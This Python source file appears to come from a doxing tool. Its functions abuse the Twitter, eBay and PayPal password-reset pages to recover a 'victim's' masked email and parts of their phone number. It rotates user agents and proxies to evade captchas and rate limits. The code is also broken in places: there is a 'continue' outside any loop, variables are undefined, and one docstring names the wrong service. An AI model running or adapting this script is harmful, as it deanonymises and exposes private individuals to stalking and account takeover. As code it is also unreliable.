def get_masked_email_twitter(victim_email, verbose):
    """
    Uses Amazon to obtain masked email by resetting passwords using phone numbers
    :param phone_numbers: List of possible phone numbers
    :param victim_email: Victim email
    :param verbose: Verbose mode
    :return:
    """
    global userAgents
    global proxyList
    logger.info("Using Twitter to find victim's phone number...")
    found_possible_number = False
    regex_email = r"[a-zA-Z0-9]\**[a-zA-Z0-9]@[a-zA-Z0-9]+\.[a-zA-Z0-9]+"


    # Pick random user agents to help prevent captcha
    user_agent = random.choice(userAgents)
    proxy = random.choice(proxyList) if proxyList else None
    session = requests.Session()
    response = session.get(
        "https://twitter.com/account/begin_password_reset",
        headers={
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Push-State-Request": "true",
            "X-Requested-With": "XMLHttpRequest",
            "X-Twitter-Active-User": "yes",
            "User-Agent": user_agent,
            "X-Asset-Version": "5bced1",
            "Referer": "https://twitter.com/login",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9"
        },
        proxies=proxy,
        verify=verifyProxy
    )
    authenticity_token = ""
    regex_output = re.search(
        r'authenticity_token.+value="(\w+)">', response.text)
    if regex_output and regex_output.group(1):
        authenticity_token = regex_output.group(1)
    else:
        if verbose:
            logger.info(
                "%sTwitter did not display a masked email for number: %s %s ", YELLOW, phone_number, ENDC)
        continue
    response = session.post(
        "https://twitter.com/account/begin_password_reset",
        headers={
            "Cache-Control": "max-age=0",
            "Origin": "https://twitter.com",
            "Upgrade-Insecure-Requests": "1",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": user_agent,
            "Accept":
            "text/html,application/xhtml+xml,application/xml;q=0.9,"
            "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "Referer": "https://twitter.com/account/begin_password_reset",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9"
        },
        data="authenticity_token=" + authenticity_token +
        "&account_identifier=" + phone_number,
        allow_redirects=False,
        proxies=proxy,
        verify=verifyProxy
    )
    if \
            "Location" in response.headers \
            and response.headers['Location'] == "https://twitter.com/account/password_reset_help?c=4":
        logger.error(
            "%sTwitter reports MAX attempts reached. Need to change IP. It happened while trying phone %s %s ",
            RED, phone_number, ENDC)
        continue

    response = session.get(
        "https://twitter.com/account/send_password_reset",
        headers={
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": user_agent,
            "Accept":
                "text/html,application/xhtml+xml,application/xml;q=0.9,"
                "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "Referer":
            "https://twitter.com/account/begin_password_reset",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9"
        },
        proxies=proxy,
        verify=verifyProxy
    )
    masked_email = ""
    regex_output = re.search(
        r'<strong .+>([a-zA-Z]+\*+@[a-zA-Z\*\.]+)<\/strong>', response.text)
    if regex_output and regex_output.group(1):
        masked_email = regex_output.group(1)
        if \
                len(victim_email) == len(masked_email) \
                and victim_email[0] == masked_email[0] \
                and victim_email[1] == masked_email[1] \
                and victim_email[victim_email.find('@')+1: victim_email.find('@')+2] \
            == masked_email[masked_email.find('@')+1: masked_email.find('@')+2]:
            logger.info(
                "%sTwitter found that the possible phone number for %s is: %s %s",
                GREEN, victim_email, phone_number, ENDC)
            found_possible_number = True
        else:
            if verbose:
                logger.info(
                    "%sTwitter did not find a match for email: %s and number: %s %s",
                    YELLOW, masked_email, phone_number, ENDC)
    else:
        if verbose:
            logger.info(
                "%sTwitter did not display a masked email for number: %s %s", YELLOW, phone_number, ENDC)
        continue
if not found_possible_number:
    logger.error(
        "%sCouldn't find a phone number associated to %s %s", RED, args.email, ENDC)





def scrape_ebay(email):
    """
    Scrapes ebay
    :param email: Email to use to scrape ebay
    :return:
    """
    global userAgents
    global proxyList
    logger.info("Scraping Ebay...")
    user_agent = random.choice(userAgents)
    proxy = random.choice(proxyList) if proxyList else None
    session = requests.Session()
    response = session.get(
        "https://fyp.ebay.com/EnterUserInfo?ru=https%3A%2F%2Fwww.ebay.com%2F&gchru=&clientapptype=19&rmvhdr=false",
        headers={
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": user_agent,
            "Accept":
                "text/html,application/xhtml+xml,application/xml;q=0.9,"
                "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        },
        proxies=proxy,
        verify=verifyProxy
    )
    regex_input = ""
    regex_output = re.search(r'value="(\w{60,})"', response.text)
    if regex_output and regex_output.group(1):
        regex_input = regex_output.group(1)
    else:
        logger.info("%sEbay did not report any digits %s", YELLOW, ENDC)
        return

    response = session.post(
        "https://fyp.ebay.com/EnterUserInfo?ru=https%3A%2F%2Fwww.ebay.com%2F&gchru=&clientapptype=19&rmvhdr=false",
        headers={
            "Cache-Control": "max-age=0",
            "Origin": "https://fyp.ebay.com",
            "Upgrade-Insecure-Requests": "1",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": user_agent,
            "Accept":
            "text/html,application/xhtml+xml,application/xml;q=0.9,"
            "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "Referer":
            "https://fyp.ebay.com/EnterUserInfo?ru=https%3A%2F%2Fwww.ebay.com%2F&clientapptype=19&signInUrl="
            "https%3A%2F%2Fwww.ebay.com%2Fsignin%3Ffyp%3Dsgn%26siteid%3D0%26co_partnerId%3D0%26ru%3Dhttps%25"
                            "3A%252F%252Fwww.ebay.com%252F&otpFyp=1",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        },
        data="ru=https%253A%252F%252Fwww.ebay.com%252F"
        + "&showSignInOTP="
        + "&signInUrl="
        + "&clientapptype=19"
        + "&reqinput=" + regex_input
        + "&rmvhdr=false"
        + "&gchru=&__HPAB_token_text__="
        + "&__HPAB_token_string__="
        + "&pageType="
        + "&input=" + email,
        proxies=proxy,
        verify=verifyProxy)
    first_digit = ""
    last_two_digits = ""
    regex_output = re.search(
        "text you at ([0-9]{1})xx-xxx-xx([0-9]{2})", response.text)
    if regex_output:
        if regex_output.group(1):
            first_digit = regex_output.group(1)
            logger.info("%sEbay reports that the first digit is: %s %s",
                        GREEN, first_digit, ENDC)
        if regex_output.group(2):
            last_two_digits = regex_output.group(2)
            logger.info("%sEbay reports that the last 2 digits are: %s %s",
                        GREEN, last_two_digits, ENDC)
    else:
        logger.info("%sEbay did not report any digits %s", YELLOW, ENDC)

def scrape_paypal(email):
    """
    Scrapes paypal using email
    :param email: Email to scrape
    :return:
    """
    global userAgents
    global proxyList
    logger.info("Scraping Paypal...")
    user_agent = random.choice(userAgents)
    proxy = random.choice(proxyList) if proxyList else None
    session = requests.Session()
    response = session.get(
        "https://www.paypal.com/authflow/password-recovery/",
        headers={
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": user_agent,
            "Accept":
                "text/html,application/xhtml+xml,application/xml;q=0.9,"
                "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        },
        proxies=proxy,
        verify=verifyProxy
    )
    _csrf = ""
    regex_output = re.search(
        r'"_csrf":"([a-zA-Z0-9+\/]+={0,3})"', response.text)
    if regex_output and regex_output.group(1):
        _csrf = regex_output.group(1)
    else:
        logger.info("%sPaypal did not report any digits %s", YELLOW, ENDC)
        return

    response = session.post(
        "https://www.paypal.com/authflow/password-recovery",
        headers={
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://www.paypal.com",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": user_agent,
            "Accept": "*/*",
            "Referer": "https://www.paypal.com/authflow/password-recovery/",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        },
        data="email=" + email + "&_csrf=" + _csrf,
        proxies=proxy,
        verify=verifyProxy
    )
    _csrf = _sessionID = jse = ""
    regex_output = re.search(
        r'"_csrf":"([a-zA-Z0-9+\/]+={0,3})"', response.text)
    if regex_output and regex_output.group(1):
        _csrf = regex_output.group(1)
    regex_output = re.search(r'_sessionID" value="(\w+)"', response.text)
    if regex_output and regex_output.group(1):
        _sessionID = regex_output.group(1)
    regex_output = re.search(r'jse="(\w+)"', response.text)
    if regex_output and regex_output.group(1):
        jse = regex_output.group(1)
    if not _csrf or not _sessionID or not jse:
        logger.info("%sPaypal did not report any digits %s", YELLOW, ENDC)
        return

    response = session.post(
        "https://www.paypal.com/auth/validatecaptcha",
        headers={
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://www.paypal.com",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": user_agent,
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "*/*",
            "Referer": "https://www.paypal.com/authflow/password-recovery/",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        },
        data="captcha="
        + "&_csrf=" + _csrf
        + "&_sessionID=" + _sessionID
        + "&jse=" + jse  # TODO
        + "&ads_token_js=b2c9ad327f5fa65af5a0a0a4cfa912d5cadf0f593027afffadd959390753d44d&afbacc5007731416=2e21541bb2d5470b",
        proxies=proxy,
        verify=verifyProxy
    )
    client_instance_id = ""
    regex_output = re.search(
        '"clientInstanceId":"([a-zA-Z0-9-]+)"', response.text)
    if regex_output and regex_output.group(1):
        client_instance_id = regex_output.group(1)
    else:
        logger.info("%sPaypal did not report any digits %s", YELLOW, ENDC)
        return

    response = session.get(
        "https://www.paypal.com/authflow/entry/?clientInstanceId=" + client_instance_id,
        headers={
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": user_agent,
            "Accept":
                "text/html,application/xhtml+xml,application/xml;q=0.9,"
                "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "Referer": "https://www.paypal.com/authflow/password-recovery/",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        },
        proxies=proxyList,
        verify=verifyProxy
    )
    last_digits = ""
    regex_output = re.search(
        r"Mobile <span.+((\d+)\W+(\d+))<\/span>", response.text)
    if regex_output and regex_output.group(3):
        last_digits = regex_output.group(3)
        logger.info("%sPaypal reports that the last %s digits are: %s %s",
                    GREEN, len(regex_output.group(3)), last_digits, ENDC)
        if regex_output.group(2):
            first_digit = regex_output.group(2)
            logger.info(
                "%sPaypal reports that the first digit is: %s %s", GREEN, first_digit, ENDC)
        if regex_output.group(1):
            logger.info(
                "%sPaypal reports that the length of the phone number (without country code) is %s digits %s",
                GREEN, len(regex_output.group(1)), ENDC)
            # TODO: remove spaces
    else:
        logger.info("%sPaypal did not report any digits %s", YELLOW, ENDC)


